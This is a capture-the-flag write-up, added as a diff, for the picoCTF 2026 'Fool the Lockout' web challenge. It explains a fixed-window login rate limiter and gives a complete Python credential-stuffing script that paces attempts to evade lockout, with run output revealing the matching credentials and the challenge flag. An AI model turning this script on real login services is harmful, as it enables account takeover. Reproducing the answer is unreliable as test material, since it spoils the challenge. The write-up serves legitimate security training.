@@ -1,0 +1,77 @@
+The Fool the Lockout challenge in picoCTF 2026 is a Web Exploitation task that demonstrates how to bypass a poorly implemented IP-based rate limiter to perform a credential stuffing attack. 
+
+🔍 Challenge Overview
+The application implements a login rate limit to prevent brute-forcing:
+
+Max Attempts: 10 failed logins. 
+Time Window: 30 seconds (EPOCH_DURATION). 
+Lockout Duration: 120 seconds.
+The source code reveals a critical flaw in the refresh_request_rates_db function: it uses a fixed time window rather than a sliding window.  The counter resets to zero strictly when current_time - epoch_start > 30 seconds. 
+
+
+Fool the Lockout picoCTF 2026 writeup
+
+View all
+🛠️ Exploitation Strategy: Time-Based Bypass
+Unlike other challenges that require header spoofing (e.g., X-Forwarded-For), this specific instance tracks limits strictly by time. The solution is to slow down the attack to stay under the threshold. 
+
+The Logic
+Batching: Send exactly 9 login attempts (one less than the limit of 10). 
+Waiting: Pause for 32 seconds (slightly more than the 30s window) to force the server to reset the counter. 
+Repeating: Continue this cycle until the correct credential pair from the provided dump is found. 
+
+picoCTF Fool the Lockout credential stuffing site:reddit.com
+
+View all
+💻 Exploit Script
+The following Python script automates the process using the provided creds-dump.txt:
+
+import requests
+import time
+import re
+import sys
+
+TARGET = 'http://candy-mountain.picoctf.net:<PORT>' # Replace with your instance port
+BATCH_SIZE = 9
+SLEEP_TIME = 32
+
+# Load credentials
+creds = []
+with open('creds-dump.txt') as f:
+    for line in f:
+        user, pw = line.strip().split(';', 1)
+        creds.append((user, pw))
+
+batch_count = 0
+print(f'[*] Loaded {len(creds)} credential pairs')
+
+for user, pw in creds:
+    if batch_count == BATCH_SIZE:
+        print(f'\n[*] Rate limit near. Waiting {SLEEP_TIME}s for reset...')
+        time.sleep(SLEEP_TIME)
+        batch_count = 0
+    
+    batch_count += 1
+    print(f'[TRY] {user}:{pw}')
+    
+    with requests.Session() as s:
+        r = s.post(f'{TARGET}/login', data={'username': user, 'password': pw}, allow_redirects=False)
+        
+        # Check for successful login (Redirect 302)
+        if r.status_code in (301, 302):
+            print(f'\n[SUCCESS] Found credentials: {user}:{pw}')
+            home = s.get(f'{TARGET}/')
+            flag = re.search(r'picoCTF\{[^}]+\}', home.text)
+            if flag:
+                print(f'[FLAG] {flag.group(0)}')
+            sys.exit(0)
+                                                                                                                                                                       
+┌──(white㉿white)-[~/…/PICO-CTF/picoctfAI/web/source]
+└─$ python3 Fool.py
+[*] Loaded 100 credential pairs
+[TRY] rora:winner1
+[TRY] birendra:rumble
+[TRY] khalid:sting
+
+[SUCCESS] Found credentials: khalid:sting
+[FLAG] picoCTF{f00l_7h4t_l1m1t3r_011089cc}
